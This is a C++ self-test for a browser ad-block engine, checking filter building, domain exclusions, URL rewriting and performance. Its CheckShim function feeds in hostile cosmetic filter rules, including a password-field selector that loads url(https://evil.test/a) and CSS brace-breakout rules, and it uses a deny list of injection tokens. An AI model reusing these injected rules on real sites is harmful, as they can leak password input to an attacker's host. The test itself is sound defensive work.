// Copyright 2026 The Open Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "open/adblock/open_adblock_selftest.h"

#include <cstdio>
#include <string>
#include <string_view>
#include <utility>
#include <vector>

#include "base/strings/string_util.h"
#include "base/timer/elapsed_timer.h"
#include "open/adblock/open_adblock_service.h"
#include "open/adblock/rust/src/lib.rs.h"
#include "url/gurl.h"

namespace open_engine {

namespace {

void Line(const std::string& text) {
  fprintf(stderr, "OpenAdBlockSelftest: %s\n", text.c_str());
}

bool Expect(bool ok, const std::string& what) {
  Line(std::string(ok ? "ok   " : "FAIL ") + what);
  return ok;
}

using open_adblock::OpenRequestType;

rust::Box<open_adblock::OpenAdblockEngine> BuildLines(
    const std::vector<std::string>& lines) {
  rust::Vec<rust::String> texts;
  texts.push_back(rust::String(base::JoinString(lines, "\n")));
  return open_adblock::open_adblock_build(
      rust::Slice<const rust::String>(texts.data(), texts.size()), rust::Str());
}

// What no selector may carry across the bridge: block braces, a resource
// load, a comment, or a procedural operator (adblock-fork §8.3). A quoted
// ";" is fine (real lists use it in attribute values).
bool IsCleanSelector(std::string_view selector) {
  for (std::string_view bad :
       {"{", "}", "/*", "url(", ":has-text(", ":-abp-", ":style("}) {
    if (selector.find(bad) != std::string_view::npos) {
      return false;
    }
  }
  return true;
}

// Checks that need no generation on disk: the review's injection lines
// (98-2), a procedural selector next to plain ones (98-1), a 4-byte DAT
// (98-3), and a list a DAT cannot restore (98-4, 100-1(b)).
bool CheckShim() {
  bool ok = true;
  // Host rules: generic "##.class" rules go through HiddenSelectors().
  auto injected = BuildLines({
      "example.com##x{} input[type=password][value^=\"a\"]"
      "{background:url(https://evil.test/a)} y",
      "example.com##.banner:style(background: url(https://evil.test/p.gif) "
      "!important)",
      "example.com##.box:style(color: red } body { background: "
      "url(https://evil.test/q) )",
      "example.com##.plain-ad",
      "example.com##div[style^=\"z-index: 9;\"]",
      "example.com##.styled:style(color: red)",
      "example.com##.promo:has-text(Advertisement)",
  });
  open_adblock::OpenCosmeticResources cosmetic =
      open_adblock::open_adblock_cosmetic(*injected, "https://example.com/");
  bool clean = true;
  int plain = 0;
  for (const rust::String& selector : cosmetic.hide_selectors) {
    clean &= IsCleanSelector(std::string(selector));
    plain += std::string(selector) == ".plain-ad" ||
             std::string(selector) == "div[style^=\"z-index: 9;\"]";
  }
  std::string styles;
  for (const auto& rule : cosmetic.style_rules) {
    styles += std::string(rule.selector) + "{" + std::string(rule.declarations) +
              "}";
    clean &= IsCleanSelector(std::string(rule.selector)) &&
             std::string(rule.declarations).find("url(") == std::string::npos;
  }
  Line("injection hide=" + std::to_string(cosmetic.hide_selectors.size()) +
       " styles=\"" + styles + "\" dropped_procedural=" +
       std::to_string(cosmetic.dropped_procedural) +
       " dropped_unsafe=" + std::to_string(cosmetic.dropped_unsafe));
  ok &= Expect(clean && plain == 2,
               "no injected CSS crosses the bridge; plain and quoted-';' "
               "selectors kept");
  ok &= Expect(styles == ".styled{color: red !important}",
               "safe :style() kept with !important; url() styles dropped");
  ok &= Expect(cosmetic.dropped_procedural >= 1 && cosmetic.dropped_unsafe >= 3,
               "procedural and unsafe rules counted");

  auto empty = open_adblock::open_adblock_create_empty();
  const uint8_t magic[] = {0xd1, 0xd9, 0x3a, 0xaf};
  ok &= Expect(!open_adblock::open_adblock_deserialize(
                   *empty, rust::Slice<const uint8_t>(magic, sizeof(magic)),
                   rust::Str()),
               "a 4-byte DAT is refused, no crash");

  auto lossy = BuildLines({"||example.com^$removeparam=test", "||ads.test^"});
  open_adblock::OpenBuildReport report =
      open_adblock::open_adblock_build_report(*lossy);
  ok &= Expect(!report.lossless && report.lossy_kinds.size() == 1 &&
                   std::string(report.lossy_kinds[0]) == "removeparam",
               "a $removeparam list is reported lossy (no DAT)");
  open_adblock::OpenBlockerResult rewritten = open_adblock::open_adblock_check(
      *lossy, "https://example.com/?q=1&test=2#blue", "https://example.com/",
      OpenRequestType::Document);
  ok &= Expect(std::string(rewritten.rewritten_url) == "https://example.com/?q=1",
               "$removeparam rewrites (fragment not matched)");

  // §7.7: past 8 KiB only the prefix is matched and nothing is rewritten.
  std::string long_url = "https://example.com/?test=2&pad=" + std::string(9000, 'a');
  open_adblock::OpenBlockerResult capped = open_adblock::open_adblock_check(
      *lossy, long_url, "https://example.com/", OpenRequestType::Document);
  ok &= Expect(capped.truncated && std::string(capped.rewritten_url).empty(),
               "a URL over 8 KiB is cut and never rewritten");
  Line("engine format " + std::string(open_adblock::open_adblock_engine_format()));
  return ok;
}

void OnLoaded(base::WeakPtr<OpenAdBlockService> service,
              base::FilePath service_root,
              base::OnceCallback<void(bool)> done) {
  if (!service) {
    Line("FAIL service gone");
    std::move(done).Run(false);
    return;
  }
  const AdBlockStatus status = service->GetStatus();
  Line("status enabled=" + std::to_string(status.enabled) +
       " engine_loaded=" + std::to_string(status.engine_loaded) +
       " engine_from_dat=" + std::to_string(status.engine_from_dat) +
       " generation=" + std::to_string(status.generation) +
       " list_count=" + std::to_string(status.list_count) +
       " dat_size_bytes=" + std::to_string(status.dat_size_bytes) +
       " last_build_ms=" + std::to_string(status.last_build_ms) +
       " last_error=\"" + status.last_error + "\"" +
       " excluded=" + base::JoinString(status.excluded_domains, ","));

  bool ok = Expect(status.engine_loaded && status.list_count > 0,
                   "engine loaded from the live generation");
  ok &= Expect(status.last_error.empty(), "no load or cache error");
  ok &= Expect(service
                   ->Check(GURL("https://www.google-analytics.com/analytics.js"),
                           GURL("https://example.com/"), OpenRequestType::Script)
                   .matched,
               "third-party analytics script blocked");
  ok &= Expect(!service
                    ->Check(GURL("https://example.com/main.css"),
                            GURL("https://example.com/"),
                            OpenRequestType::Stylesheet)
                    .matched,
               "first-party stylesheet allowed");
  ok &= Expect(
      !service->Check(GURL("not a url"), GURL(), OpenRequestType::Script).matched,
      "invalid URL allowed");
  ok &= Expect(status.excluded_domains ==
                   std::vector<std::string>{"[::1]", "example.com",
                                            "news.example.org"},
               "excluded domains normalized; bare suffix, path, empty skipped");
  // Behavior, not stored strings (review 100-4): an entry covers its domain
  // and subdomains at a label boundary.
  ok &= Expect(service->IsExcluded(GURL("https://www.example.com/a")) &&
                   service->IsExcluded(GURL("https://example.com/")) &&
                   service->IsExcluded(GURL("https://a.news.example.org/")) &&
                   service->IsExcluded(GURL("https://news.example.org/")) &&
                   service->IsExcluded(GURL("http://[::1]:8080/")) &&
                   !service->IsExcluded(GURL("https://example.org/")) &&
                   !service->IsExcluded(GURL("https://other.example.org/")) &&
                   !service->IsExcluded(GURL("https://notexample.com/")),
               "exclusions match the domain and its subdomains only");
  ok &= Expect(!service->HiddenSelectors({"ad--300x250"}, {}, {}).empty(),
               "generic class selector found");

  // adblock-fork §13.4: mean cost of one page's cosmetic query.
  base::ElapsedTimer timer;
  size_t hide_count = 0;
  for (int i = 0; i < 100; ++i) {
    hide_count = service->CosmeticResources(GURL("https://www.nytimes.com/"))
                     .hide_selectors.size();
  }
  const int64_t mean_us = timer.Elapsed().InMicroseconds() / 100;
  Line("cosmetic mean_us=" + std::to_string(mean_us) +
       " hide_selectors=" + std::to_string(hide_count));
  ok &= Expect(hide_count > 0 && mean_us <= 100,
               "cosmetic query within 100 us per page");

  // A page whose lists have procedural rules still gets its plain hiding,
  // and no procedural or unsafe selector (review 98-1).
  open_adblock::OpenCosmeticResources gamedev =
      service->CosmeticResources(GURL("https://www.gamedev.net/"));
  bool clean = true;
  for (const rust::String& selector : gamedev.hide_selectors) {
    clean &= IsCleanSelector(std::string(selector));
  }
  Line("gamedev.net hide_selectors=" +
       std::to_string(gamedev.hide_selectors.size()) +
       " dropped_procedural=" + std::to_string(gamedev.dropped_procedural) +
       " dropped_unsafe=" + std::to_string(gamedev.dropped_unsafe));
  ok &= Expect(clean && gamedev.hide_selectors.size() > 100,
               "gamedev.net: plain selectors kept, procedural ones dropped");

  // Network check cost on realistic ad-tech URL shapes (review C-2, the six
  // shapes of its realurl probe; 58 to 2,040 characters). Information only:
  // Step 4's gate G-1 to G-7 uses a real-URL corpus.
  auto query = [](size_t n) {
    std::string out;
    for (size_t i = 0; out.size() < n; ++i) {
      out += "p" + std::to_string(i) + "=v" + std::to_string(i * 7919 % 100000) +
             "a" + std::to_string(i) + "&";
    }
    return out;
  };
  const std::pair<std::string, OpenRequestType> shapes[] = {
      {"https://securepubads.g.doubleclick.net/gampad/ads?" + query(1400),
       OpenRequestType::Xmlhttprequest},
      {"https://www.google-analytics.com/g/collect?v=2&" + query(700),
       OpenRequestType::Ping},
      {"https://cdn.example-news.com/assets/js/app.a1b2c3d4e5f6.js",
       OpenRequestType::Script},
      {"https://images.example-news.com/photo/2026/10/26/" +
           std::string(40, 'x') + ".jpg?w=640&q=80",
       OpenRequestType::Image},
      {"https://api.example-news.com/v2/articles?" + query(300),
       OpenRequestType::Xmlhttprequest},
      {"https://pixel.tracker-example.com/p.gif?" + query(2000),
       OpenRequestType::Image},
  };
  const GURL source("https://www.example-news.com/");
  int64_t total_us100 = 0;
  std::string per_shape;
  for (const auto& [spec, type] : shapes) {
    const GURL url(spec);
    service->Check(url, source, type);
    base::ElapsedTimer shape_timer;
    for (int i = 0; i < 500; ++i) {
      service->Check(url, source, type);
    }
    const int64_t us100 = shape_timer.Elapsed().InMicroseconds() / 5;
    total_us100 += us100;
    per_shape += " " + std::to_string(spec.size()) + ":" +
                 std::to_string(us100 / 100) + "." +
                 std::to_string(us100 % 100 / 10);
  }
  Line("check realistic_mean_us=" + std::to_string(total_us100 / 6 / 100) + "." +
       std::to_string(total_us100 / 6 % 100 / 10) + " per_shape(chars:us)=" +
       per_shape);

  ok &= CheckShim();
  Line(ok ? "PASS" : "FAIL");
  // Quit while a text build runs: Shutdown() drops the pending result, and
  // the process must still exit cleanly (review: harness honesty).
  service->LoadFromDirectory(service_root, /*prefer_dat=*/false);
  Line("quitting with a text build in flight");
  std::move(done).Run(ok);
}

}  // namespace

void RunOpenAdBlockSelftest(OpenAdBlockService* service,
                            base::FilePath adblock_root,
                            base::OnceCallback<void(bool)> done) {
  Line("loading " + adblock_root.value());
  service->SetEnabled(true);
  service->SetExcludedDomains(
      {"Example.COM.", "*.news.example.org", "com", "bad/x", "", "::1"});
  service->LoadFromDirectory(
      adblock_root, /*prefer_dat=*/true,
      base::BindOnce(&OnLoaded, service->GetWeakPtr(), adblock_root,
                     std::move(done)));
}

}  // namespace open_engine
